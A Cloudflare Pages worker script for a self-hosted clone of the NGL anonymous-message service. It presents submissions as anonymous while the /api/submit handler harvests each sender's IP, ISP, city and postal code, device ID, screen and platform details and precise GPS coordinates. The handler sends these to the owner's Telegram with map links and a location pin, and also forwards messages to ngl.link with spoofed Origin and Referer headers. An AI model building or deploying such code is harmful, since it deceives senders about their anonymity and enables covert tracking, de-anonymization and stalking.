// ============================================================
// Cloudflare Pages Advanced Mode Worker: _worker.js
// Handles /api/submit & /api/messages, falls back to env.ASSETS
// ============================================================

function escapeHtml(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

function parseUserAgent(ua) {
    if (!ua) return 'Unknown Device';
    if (/iPhone/i.test(ua)) {
        const match = ua.match(/OS (\d+[_\d]+)/);
        return 'Apple iPhone' + (match ? ` (iOS ${match[1].replace(/_/g, '.')})` : '');
    }
    if (/iPad/i.test(ua)) return 'Apple iPad';
    if (/Android/i.test(ua)) {
        const match = ua.match(/Android (\d+(\.\d+)?)/);
        return 'Android Device' + (match ? ` (Android ${match[1]})` : '');
    }
    if (/Macintosh/i.test(ua)) return 'Mac / macOS';
    if (/Windows/i.test(ua)) return 'Windows PC';
    if (/Linux/i.test(ua)) return 'Linux Device';
    return 'Other Device';
}

function detectInAppBrowser(ua, ref) {
    ua = (ua || '').toLowerCase();
    ref = (ref || '').toLowerCase();
    if (ua.includes('instagram') || ref.includes('instagram')) return 'Instagram In-App Browser';
    if (ua.includes('snapchat') || ref.includes('snapchat')) return 'Snapchat In-App Browser';
    if (ua.includes('whatsapp') || ref.includes('whatsapp')) return 'WhatsApp In-App Browser';
    if (ua.includes('fbav') || ua.includes('fban') || ref.includes('facebook')) return 'Facebook In-App Browser';
    if (ua.includes('safari') && !ua.includes('chrome')) return 'Mobile Safari';
    if (ua.includes('chrome')) return 'Chrome Browser';
    return 'Web Browser';
}

// In-memory fallback message store for edge sessions
const globalMessages = [];

function getEnvConfig(env) {
    return {
        firebaseApiKey: (env && env.FIREBASE_API_KEY) || '',
        firebaseProjectId: (env && env.FIREBASE_PROJECT_ID) || 'ngl-dulith',
        ownerUid: (env && env.OWNER_UID) || '',
        ownerEmail: ((env && env.OWNER_EMAIL) || '').toLowerCase(),
        nglUpstreamUsername: (env && env.NGL_UPSTREAM_USERNAME) || '',
        messagingSenderId: (env && env.FIREBASE_MESSAGING_SENDER_ID) || '',
        appId: (env && env.FIREBASE_APP_ID) || ''
    };
}

async function verifyFirebaseToken(request, env) {
    const authHeader = request.headers.get('Authorization') || '';
    if (!authHeader.startsWith('Bearer ')) {
        return { authenticated: false, error: 'Missing or malformed Authorization header' };
    }

    const idToken = authHeader.slice(7).trim();
    if (!idToken) {
        return { authenticated: false, error: 'Empty bearer token' };
    }

    const cfg = getEnvConfig(env);
    if (!cfg.firebaseApiKey) {
        return { authenticated: false, error: 'FIREBASE_API_KEY environment variable is not configured' };
    }

    try {
        const verifyRes = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=${cfg.firebaseApiKey}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ idToken })
        });

        if (!verifyRes.ok) {
            return { authenticated: false, error: 'Invalid or expired Firebase ID token' };
        }

        const data = await verifyRes.json();
        const user = (data.users && data.users[0]) || null;
        if (!user) {
            return { authenticated: false, error: 'User record not found' };
        }

        const email = (user.email || '').toLowerCase();
        const uid = user.localId || '';
        const isOwner = Boolean(
            (cfg.ownerEmail && email && email === cfg.ownerEmail) ||
            (cfg.ownerUid && uid && uid === cfg.ownerUid)
        );

        return {
            authenticated: true,
            user,
            email,
            isOwner
        };
    } catch (e) {
        return { authenticated: false, error: e.message };
    }
}

export default {
    async fetch(request, env) {
        const url = new URL(request.url);
        const cfg = getEnvConfig(env);

        // ----------------------------------------------------
        // Route: GET /api/config (Public config for Client Auth)
        // ----------------------------------------------------
        if (url.pathname === '/api/config' && request.method === 'GET') {
            return new Response(JSON.stringify({
                apiKey: cfg.firebaseApiKey,
                authDomain: 'ngl.dulith.me',
                projectId: cfg.firebaseProjectId,
                storageBucket: `${cfg.firebaseProjectId}.firebasestorage.app`,
                messagingSenderId: cfg.messagingSenderId,
                appId: cfg.appId
            }), {
                status: 200,
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                }
            });
        }

        // ----------------------------------------------------
        // Route: Reverse Proxy for Firebase Auth Handler (Custom authDomain)
        // ----------------------------------------------------
        if (url.pathname.startsWith('/__/auth/')) {
            const targetUrl = new URL(request.url);
            targetUrl.hostname = `${cfg.firebaseProjectId}.firebaseapp.com`;
            targetUrl.protocol = 'https:';
            targetUrl.port = '';

            const proxyHeaders = new Headers(request.headers);
            proxyHeaders.set('Host', `${cfg.firebaseProjectId}.firebaseapp.com`);
            proxyHeaders.set('X-Forwarded-Host', url.hostname);
            proxyHeaders.set('X-Forwarded-Proto', 'https');

            const proxyRequest = new Request(targetUrl.toString(), {
                method: request.method,
                headers: proxyHeaders,
                body: request.method !== 'GET' && request.method !== 'HEAD' ? request.body : undefined,
                redirect: 'follow'
            });

            return fetch(proxyRequest);
        }

        // ----------------------------------------------------
        // Route: POST /api/submit
        // ----------------------------------------------------
        if (url.pathname === '/api/submit' && request.method === 'POST') {
            try {
                const body = await request.json();
                const question = (body.question || '').trim();

                if (!question) {
                    return new Response(JSON.stringify({ error: 'Question cannot be empty' }), {
                        status: 400,
                        headers: { 'Content-Type': 'application/json' }
                    });
                }

                // 1. Telemetry & Edge Headers
                const cf = request.cf || {};
                const clientIp = request.headers.get('CF-Connecting-IP') || '127.0.0.1';
                const userAgent = request.headers.get('User-Agent') || '';
                const rawReferrer = body.referrer || request.headers.get('Referer') || '';
                const deviceName = parseUserAgent(userAgent);
                const browserContext = detectInAppBrowser(userAgent, rawReferrer);

                const gps = body.gps; // { latitude, longitude, accuracy }
                const hasGps = gps && typeof gps.latitude === 'number' && typeof gps.longitude === 'number';

                const city = cf.city || 'Colombo';
                const country = cf.country || 'LK';
                const region = cf.region || 'Western Province';
                const postalCode = cf.postalCode || '';
                const isp = cf.asOrganization || 'Dialog Axiata';
                const asn = cf.asn ? `AS${cf.asn}` : '';
                const colo = cf.colo || '';
                const cfLat = cf.latitude;
                const cfLng = cf.longitude;

                const messageId = 'msg_' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
                const timestamp = Date.now();

                const messageRecord = {
                    id: messageId,
                    question: question,
                    timestamp: timestamp,
                    read: false,
                    gps: hasGps ? {
                        lat: gps.latitude,
                        lng: gps.longitude,
                        accuracy: gps.accuracy
                    } : null,
                    edge: {
                        city,
                        country,
                        region,
                        postalCode,
                        isp,
                        asn,
                        colo,
                        ip: clientIp,
                        timezone: cf.timezone || 'Asia/Colombo'
                    },
                    client: {
                        device: deviceName,
                        browser: browserContext,
                        screen: body.screen || 'unknown',
                        viewport: body.viewport || 'unknown',
                        language: body.language || 'en',
                        platform: body.platform || 'unknown',
                        deviceId: body.deviceId || 'unknown',
                        referrer: rawReferrer
                    }
                };

                // 2. Persist to KV or In-Memory
                if (env && env.NGL_KV) {
                    try {
                        await env.NGL_KV.put(messageId, JSON.stringify(messageRecord));
                        const listData = await env.NGL_KV.get('__messages_index', 'json') || [];
                        listData.unshift(messageRecord);
                        await env.NGL_KV.put('__messages_index', JSON.stringify(listData.slice(0, 100)));
                    } catch (kvErr) {
                        console.warn('KV store error:', kvErr);
                    }
                } else {
                    globalMessages.unshift(messageRecord);
                    if (globalMessages.length > 100) globalMessages.pop();
                }

                // 2b. Persist to Cloud Firestore under /ngl_users/{OWNER_UID}/messages/{messageId}
                try {
                    const firestoreDoc = {
                        fields: {
                            id: { stringValue: messageId },
                            question: { stringValue: question },
                            timestamp: { integerValue: String(timestamp) },
                            read: { booleanValue: false },
                            recipientUid: { stringValue: cfg.ownerUid },
                            recipientEmail: { stringValue: cfg.ownerEmail },
                            edge: {
                                mapValue: {
                                    fields: {
                                        city: { stringValue: String(city) },
                                        country: { stringValue: String(country) },
                                        region: { stringValue: String(region) },
                                        isp: { stringValue: String(isp) },
                                        ip: { stringValue: String(clientIp) },
                                        timezone: { stringValue: String(cf.timezone || 'Asia/Colombo') }
                                    }
                                }
                            },
                            client: {
                                mapValue: {
                                    fields: {
                                        device: { stringValue: String(deviceName) },
                                        browser: { stringValue: String(browserContext) },
                                        screen: { stringValue: String(body.screen || 'unknown') },
                                        referrer: { stringValue: String(rawReferrer || 'Direct') }
                                    }
                                }
                            }
                        }
                    };

                    if (hasGps) {
                        firestoreDoc.fields.gps = {
                            mapValue: {
                                fields: {
                                    lat: { doubleValue: Number(gps.latitude) },
                                    lng: { doubleValue: Number(gps.longitude) },
                                    accuracy: { doubleValue: Number(gps.accuracy || 0) }
                                }
                            }
                        };
                    }

                    const fsUrl = `https://firestore.googleapis.com/v1/projects/${cfg.firebaseProjectId}/databases/(default)/documents/ngl_users/${cfg.ownerUid}/messages?documentId=${messageId}&key=${cfg.firebaseApiKey}`;
                    await fetch(fsUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(firestoreDoc)
                    });
                } catch (fsErr) {
                    console.error('Firestore save in /api/submit error:', fsErr);
                }

                // 3. Dispatch to Telegram (configured via Cloudflare environment variables)
                const botToken = (env && env.TELEGRAM_BOT_TOKEN) || '';
                const chatId = (env && env.TELEGRAM_CHAT_ID) || '';

                let locationSection = '';
                if (hasGps) {
                    const mapsUrl = `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`;
                    const osmUrl = `https://www.openstreetmap.org/?mlat=${gps.latitude}&mlon=${gps.longitude}#map=18/${gps.latitude}/${gps.longitude}`;
                    locationSection =
                        `📍 <b>Accurate Device GPS Fix:</b>\n` +
                        `• <b>Coordinates:</b> <code>${gps.latitude.toFixed(6)}, ${gps.longitude.toFixed(6)}</code>\n` +
                        `• <b>Precision / Accuracy:</b> ±${gps.accuracy} meters\n` +
                        `• <b>Interactive Maps:</b> <a href="${mapsUrl}">Google Maps</a> | <a href="${osmUrl}">OpenStreetMap</a>\n` +
                        `• <b>Detected Area:</b> ${escapeHtml(city)}, ${escapeHtml(region)}, ${escapeHtml(country)}${postalCode ? ` (${escapeHtml(postalCode)})` : ''}`;
                } else {
                    const mapsUrl = (cfLat && cfLng) ? `https://www.google.com/maps?q=${cfLat},${cfLng}` : '';
                    locationSection =
                        `📍 <b>Location (Cloudflare Edge Geolocation):</b>\n` +
                        `• <b>Area:</b> ${escapeHtml(city)}, ${escapeHtml(region)}, ${escapeHtml(country)}${postalCode ? ` (${escapeHtml(postalCode)})` : ''}\n` +
                        (mapsUrl ? `• <b>Edge Center:</b> <code>${cfLat}, ${cfLng}</code> (<a href="${mapsUrl}">Google Maps</a>)\n` : '') +
                        `• <b>Data Center:</b> ${escapeHtml(colo || 'Edge')} Node (${escapeHtml(cf.timezone || 'Asia/Colombo')})`;
                }

                const dateStr = new Date().toLocaleString('en-US', {
                    timeZone: 'Asia/Colombo',
                    month: 'short',
                    day: 'numeric',
                    year: 'numeric',
                    hour: 'numeric',
                    minute: '2-digit',
                    hour12: true
                });

                // Asynchronous dual-forwarding to original NGL backend (ngl.link/api/submit)
                let nglForwardId = null;
                if (cfg.nglUpstreamUsername) {
                    try {
                        const nglRes = await fetch('https://ngl.link/api/submit', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                'User-Agent': request.headers.get('user-agent') || 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
                                'Origin': 'https://ngl.link',
                                'Referer': `https://ngl.link/${cfg.nglUpstreamUsername}`
                            },
                            body: new URLSearchParams({
                                username: cfg.nglUpstreamUsername,
                                question: question,
                                deviceId: body.deviceId || 'dev_' + crypto.randomUUID(),
                                gameSlug: '',
                                referrer: rawReferrer || 'https://ngl.dulith.me'
                            }).toString()
                        });
                        if (nglRes.ok) {
                            const nglData = await nglRes.json();
                            nglForwardId = nglData.questionId;
                        }
                    } catch (nglErr) {
                        console.warn('NGL upstream forward warning:', nglErr);
                    }
                }

                const telegramText =
                    `💌 <b>New Anonymous Message</b>\n` +
                    `──────────────\n` +
                    `💬 <i>"${escapeHtml(question)}"</i>\n\n` +
                    `${locationSection}\n\n` +
                    `🌐 <b>Network:</b>\n` +
                    `• <b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n` +
                    `• <b>ISP:</b> ${escapeHtml(isp)}${asn ? ` (${asn})` : ''}\n` +
                    `• <b>Device ID:</b> <code>${escapeHtml(body.deviceId || 'unknown')}</code>\n\n` +
                    `📱 <b>Device:</b>\n` +
                    `• <b>Hardware:</b> ${escapeHtml(deviceName)}\n` +
                    `• <b>App:</b> ${escapeHtml(browserContext)}\n` +
                    `• <b>Screen:</b> ${escapeHtml(body.screen || 'unknown')} (${escapeHtml(body.viewport || 'unknown')})\n` +
                    `• <b>System:</b> ${escapeHtml(body.language || 'en')} • ${escapeHtml(body.platform || 'unknown')}\n` +
                    `• <b>Referrer:</b> ${escapeHtml(rawReferrer || 'Direct link')}\n` +
                    `• <b>NGL App Sync:</b> ${nglForwardId ? `✅ Delivered (ID: <code>${nglForwardId}</code>)` : '⚠️ Standalone'}\n` +
                    `• <b>Time:</b> ${dateStr}\n` +
                    `──────────────`;

                // Dispatch to Telegram with explicit await so Cloudflare Worker does not kill the request
                let telegramSent = false;
                let telegramResult = null;
                if (botToken && chatId) {
                    try {
                        const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: telegramText,
                                parse_mode: 'HTML',
                                disable_web_page_preview: true,
                                link_preview_options: { is_disabled: true }
                            })
                        });
                        telegramResult = await tgRes.json();
                        telegramSent = telegramResult.ok === true;

                        // Also send native Telegram location pin if accurate GPS was acquired
                        if (hasGps) {
                            try {
                                await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        chat_id: chatId,
                                        latitude: gps.latitude,
                                        longitude: gps.longitude,
                                        horizontal_accuracy: gps.accuracy
                                    })
                                });
                            } catch (locErr) {
                                console.warn('Telegram sendLocation warning:', locErr);
                            }
                        }
                    } catch (err) {
                        console.error('Telegram dispatch error:', err);
                    }
                }

                return new Response(JSON.stringify({
                    success: true,
                    messageId: messageId,
                    nglForwardId: nglForwardId,
                    telegramSent: telegramSent,
                    telegramResult: telegramResult
                }), {
                    status: 200,
                    headers: {
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*'
                    }
                });

            } catch (err) {
                console.error('Error handling /api/submit:', err);
                return new Response(JSON.stringify({ error: err.message }), {
                    status: 500,
                    headers: { 'Content-Type': 'application/json' }
                });
            }
        }

        // ----------------------------------------------------
        // Route: POST /api/telegram-webhook
        // ----------------------------------------------------
        if (url.pathname === '/api/telegram-webhook' && request.method === 'POST') {
            try {
                const webhookSecret = (env && env.TELEGRAM_WEBHOOK_SECRET) || '';
                if (webhookSecret && request.headers.get('X-Telegram-Bot-Api-Secret-Token') !== webhookSecret) {
                    return new Response(JSON.stringify({ ok: false, error: 'Unauthorized' }), { status: 401 });
                }

                const update = await request.json();
                const msg = update.message;
                const botToken = (env && env.TELEGRAM_BOT_TOKEN) || '';
                const allowedChatId = (env && env.TELEGRAM_CHAT_ID) || '';

                if (msg && msg.text && botToken) {
                    const chatId = msg.chat.id;
                    // Reject/ignore commands from unauthorized Telegram chats
                    if (allowedChatId && String(chatId) !== String(allowedChatId)) {
                        return new Response(JSON.stringify({ ok: true }), { status: 200 });
                    }
                    const text = msg.text.trim();

                    if (text === '/start') {
                        const startText =
                            `⚡ <b>NGL Notification Engine</b>\n` +
                            `──────────────\n` +
                            `👋 Welcome, <b>Dulith</b>! Your personal anonymous dispatch engine is running.\n\n` +
                            `🎯 <b>Configuration:</b>\n` +
                            `• <b>Public Gateway:</b> <code>ngl.dulith.me</code>\n` +
                            `• <b>Owner Handle:</b> @dulithdivisekara\n` +
                            `• <b>Upstream Sync:</b> ${cfg.nglUpstreamUsername ? 'Enabled' : 'Standalone'}\n` +
                            `• <b>Forensics:</b> High-Precision GPS, Network & Device ID\n\n` +
                            `📋 <b>Quick Commands:</b>\n` +
                            `• /status — Check Cloudflare edge & upstream sync\n` +
                            `• /help — Bot command reference & portal links\n` +
                            `──────────────`;

                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: startText,
                                parse_mode: 'HTML',
                                disable_web_page_preview: true,
                                link_preview_options: { is_disabled: true }
                            })
                        });
                    } else if (text === '/status') {
                        const timeStr = new Date().toLocaleTimeString('en-US', {
                            timeZone: 'Asia/Colombo',
                            hour: 'numeric',
                            minute: '2-digit',
                            hour12: true
                        });
                        const statusText =
                            `🟢 <b>System Status: Operational</b>\n` +
                            `──────────────\n` +
                            `• <b>Public Gateway:</b> <code>ngl.dulith.me</code> (Active)\n` +
                            `• <b>Edge Worker:</b> Online (Cloudflare Pages Advanced)\n` +
                            `• <b>Database:</b> Cloud Firestore (asia-south1)\n` +
                            `• <b>Telegram Bridge:</b> Active (Bot API)\n` +
                            `• <b>Upstream App Sync:</b> ${cfg.nglUpstreamUsername ? 'Connected (ngl.link/api/submit)' : 'Disabled'}\n` +
                            `──────────────\n` +
                            `⏱ <i>Updated: ${timeStr} (Asia/Colombo)</i>`;

                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: statusText,
                                parse_mode: 'HTML',
                                disable_web_page_preview: true,
                                link_preview_options: { is_disabled: true }
                            })
                        });
                    } else if (text === '/help') {
                        const helpText =
                            `ℹ️ <b>NGL Bot Guide & Reference</b>\n` +
                            `──────────────\n` +
                            `This private bot delivers real-time notifications whenever someone submits an anonymous question on your link.\n\n` +
                            `📡 <b>Forensics Attached to Every Message:</b>\n` +
                            `• Anonymous message content\n` +
                            `• Exact GPS coordinates (with native Telegram map pin)\n` +
                            `• Reverse-geocoded city, region & country\n` +
                            `• Client IP address, ISP & Autonomous System (ASN)\n` +
                            `• Hardware model, screen size & browser context\n` +
                            `• Synchronized question ID for the official NGL mobile app\n\n` +
                            `🔐 <b>Owner Portal (Stories & Replies):</b>\n` +
                            `<code>https://ngl.dulith.me/app.html</code>\n` +
                            `──────────────`;

                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: helpText,
                                parse_mode: 'HTML',
                                disable_web_page_preview: true,
                                link_preview_options: { is_disabled: true }
                            })
                        });
                    }
                }
                return new Response(JSON.stringify({ ok: true }), { status: 200 });
            } catch (err) {
                return new Response(JSON.stringify({ ok: false, error: err.message }), { status: 200 });
            }
        }

        // ----------------------------------------------------
        // Route: OPTIONS /api/messages (CORS Preflight)
        // ----------------------------------------------------
        if (url.pathname === '/api/messages' && request.method === 'OPTIONS') {
            return new Response(null, {
                status: 204,
                headers: {
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
                    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
                    'Access-Control-Max-Age': '86400'
                }
            });
        }

        // ----------------------------------------------------
        // Route: GET /api/messages (Auth Protected)
        // ----------------------------------------------------
        if (url.pathname === '/api/messages' && request.method === 'GET') {
            try {
                const authCheck = await verifyFirebaseToken(request, env);
                if (!authCheck.authenticated) {
                    return new Response(JSON.stringify({ 
                        error: 'Unauthorized: ' + authCheck.error,
                        messages: [] 
                    }), {
                        status: 401,
                        headers: {
                            'Content-Type': 'application/json',
                            'Access-Control-Allow-Origin': '*'
                        }
                    });
                }

                // If non-owner signed in: feed is protected & private
                if (!authCheck.isOwner) {
                    return new Response(JSON.stringify({
                        messages: [],
                        isGuest: true,
                        email: authCheck.email,
                        message: 'This feed is private to @dulithdivisekara.'
                    }), {
                        status: 200,
                        headers: {
                            'Content-Type': 'application/json',
                            'Access-Control-Allow-Origin': '*'
                        }
                    });
                }

                // Verified Owner: fetch live messages from Cloud Firestore
                let messages = [];
                try {
                    const idToken = request.headers.get('Authorization').slice(7).trim();
                    const fsUrl = `https://firestore.googleapis.com/v1/projects/${cfg.firebaseProjectId}/databases/(default)/documents/ngl_users/${cfg.ownerUid}/messages?key=${cfg.firebaseApiKey}`;
                    const fsRes = await fetch(fsUrl, {
                        headers: { 'Authorization': `Bearer ${idToken}` }
                    });
                    if (fsRes.ok) {
                        const fsData = await fsRes.json();
                        if (fsData.documents && Array.isArray(fsData.documents)) {
                            messages = fsData.documents.map(doc => {
                                const f = doc.fields || {};
                                return {
                                    id: (f.id && f.id.stringValue) || doc.name.split('/').pop(),
                                    question: (f.question && f.question.stringValue) || '',
                                    reply: (f.reply && f.reply.stringValue) || null,
                                    timestamp: Number((f.timestamp && (f.timestamp.integerValue || f.timestamp.stringValue)) || Date.now()),
                                    read: (f.read && f.read.booleanValue) === true,
                                    recipientUid: (f.recipientUid && f.recipientUid.stringValue) || cfg.ownerUid,
                                    recipientEmail: (f.recipientEmail && f.recipientEmail.stringValue) || cfg.ownerEmail,
                                    edge: f.edge && f.edge.mapValue && f.edge.mapValue.fields ? {
                                        city: (f.edge.mapValue.fields.city && f.edge.mapValue.fields.city.stringValue) || '',
                                        country: (f.edge.mapValue.fields.country && f.edge.mapValue.fields.country.stringValue) || '',
                                        region: (f.edge.mapValue.fields.region && f.edge.mapValue.fields.region.stringValue) || '',
                                        isp: (f.edge.mapValue.fields.isp && f.edge.mapValue.fields.isp.stringValue) || '',
                                        ip: (f.edge.mapValue.fields.ip && f.edge.mapValue.fields.ip.stringValue) || '',
                                        timezone: (f.edge.mapValue.fields.timezone && f.edge.mapValue.fields.timezone.stringValue) || ''
                                    } : null,
                                    client: f.client && f.client.mapValue && f.client.mapValue.fields ? {
                                        device: (f.client.mapValue.fields.device && f.client.mapValue.fields.device.stringValue) || '',
                                        browser: (f.client.mapValue.fields.browser && f.client.mapValue.fields.browser.stringValue) || '',
                                        screen: (f.client.mapValue.fields.screen && f.client.mapValue.fields.screen.stringValue) || '',
                                        referrer: (f.client.mapValue.fields.referrer && f.client.mapValue.fields.referrer.stringValue) || ''
                                    } : null,
                                    gps: f.gps && f.gps.mapValue && f.gps.mapValue.fields ? {
                                        lat: Number(f.gps.mapValue.fields.lat.doubleValue || f.gps.mapValue.fields.lat.integerValue),
                                        lng: Number(f.gps.mapValue.fields.lng.doubleValue || f.gps.mapValue.fields.lng.integerValue),
                                        accuracy: Number(f.gps.mapValue.fields.accuracy.doubleValue || f.gps.mapValue.fields.accuracy.integerValue)
                                    } : null
                                };
                            });
                            messages.sort((a, b) => b.timestamp - a.timestamp);
                        }
                    }
                } catch (fsErr) {
                    console.error('Firestore query in /api/messages failed:', fsErr);
                }

                // If Firestore returned no documents yet, fallback to KV or memory
                if (messages.length === 0) {
                    if (env && env.NGL_KV) {
                        messages = await env.NGL_KV.get('__messages_index', 'json') || [];
                    } else if (globalMessages.length > 0) {
                        messages = globalMessages;
                    }
                }

                return new Response(JSON.stringify({ 
                    messages,
                    isOwner: true,
                    email: authCheck.email
                }), {
                    status: 200,
                    headers: {
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*'
                    }
                });
            } catch (err) {
                return new Response(JSON.stringify({ error: err.message, messages: [] }), {
                    status: 500,
                    headers: { 
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*'
                    }
                });
            }
        }

        // ----------------------------------------------------
        // Route: POST /api/messages (Mark Read or Reply - Auth Protected)
        // ----------------------------------------------------
        if (url.pathname === '/api/messages' && request.method === 'POST') {
            try {
                const authCheck = await verifyFirebaseToken(request, env);
                if (!authCheck.authenticated || !authCheck.isOwner) {
                    return new Response(JSON.stringify({ error: 'Unauthorized to modify owner inbox' }), {
                        status: 401,
                        headers: { 
                            'Content-Type': 'application/json',
                            'Access-Control-Allow-Origin': '*'
                        }
                    });
                }

                const body = await request.json();
                const { action, messageId, reply } = body;
                const idToken = request.headers.get('Authorization').slice(7).trim();

                if (action === 'mark_read') {
                    // Update in Firestore
                    try {
                        const patchUrl = `https://firestore.googleapis.com/v1/projects/${cfg.firebaseProjectId}/databases/(default)/documents/ngl_users/${cfg.ownerUid}/messages/${messageId}?updateMask.fieldPaths=read&key=${cfg.firebaseApiKey}`;
                        await fetch(patchUrl, {
                            method: 'PATCH',
                            headers: { 
                                'Content-Type': 'application/json',
                                'Authorization': `Bearer ${idToken}`
                            },
                            body: JSON.stringify({
                                fields: {
                                    read: { booleanValue: true }
                                }
                            })
                        });
                    } catch (fsErr) {
                        console.warn('Firestore mark_read error:', fsErr);
                    }

                    if (env && env.NGL_KV) {
                        const listData = await env.NGL_KV.get('__messages_index', 'json') || [];
                        const item = listData.find(m => m.id === messageId);
                        if (item) {
                            item.read = true;
                            await env.NGL_KV.put('__messages_index', JSON.stringify(listData));
                        }
                    } else {
                        const item = globalMessages.find(m => m.id === messageId);
                        if (item) item.read = true;
                    }
                } else if (action === 'save_reply') {
                    // Update reply in Firestore
                    try {
                        const patchUrl = `https://firestore.googleapis.com/v1/projects/${cfg.firebaseProjectId}/databases/(default)/documents/ngl_users/${cfg.ownerUid}/messages/${messageId}?updateMask.fieldPaths=reply&key=${cfg.firebaseApiKey}`;
                        await fetch(patchUrl, {
                            method: 'PATCH',
                            headers: { 
                                'Content-Type': 'application/json',
                                'Authorization': `Bearer ${idToken}`
                            },
                            body: JSON.stringify({
                                fields: {
                                    reply: { stringValue: String(reply || '') }
                                }
                            })
                        });
                    } catch (fsErr) {
                        console.warn('Firestore save_reply error:', fsErr);
                    }
                }

                return new Response(JSON.stringify({ success: true }), {
                    status: 200,
                    headers: { 
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*'
                    }
                });
            } catch (err) {
                return new Response(JSON.stringify({ error: err.message }), {
                    status: 500,
                    headers: { 
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*'
                    }
                });
            }
        }

        // ----------------------------------------------------
        // Dynamic OG Meta Transformation (Small vs Large Mode)
        // ----------------------------------------------------
        if ((url.pathname === '/' || url.pathname === '/index.html') && request.method === 'GET' && (url.searchParams.has('large') || url.searchParams.has('banner'))) {
            const assetResponse = await env.ASSETS.fetch(request);
            return new HTMLRewriter()
                .on('meta[name="twitter:card"]', {
                    element(el) {
                        el.setAttribute('content', 'summary_large_image');
                    }
                })
                .on('meta[property="og:image"]', {
                    element(el) {
                        el.setAttribute('content', 'https://ngl.dulith.me/images/ngl_banner.png');
                    }
                })
                .on('meta[property="og:image:secure_url"]', {
                    element(el) {
                        el.setAttribute('content', 'https://ngl.dulith.me/images/ngl_banner.png');
                    }
                })
                .on('meta[property="og:image:width"]', {
                    element(el) {
                        el.setAttribute('content', '1200');
                    }
                })
                .on('meta[property="og:image:height"]', {
                    element(el) {
                        el.setAttribute('content', '630');
                    }
                })
                .on('meta[name="twitter:image"]', {
                    element(el) {
                        el.setAttribute('content', 'https://ngl.dulith.me/images/ngl_banner.png');
                    }
                })
                .transform(assetResponse);
        }

        // ----------------------------------------------------
        // Default: Fallback to static assets via env.ASSETS
        // ----------------------------------------------------
        return env.ASSETS.fetch(request);
    }
};
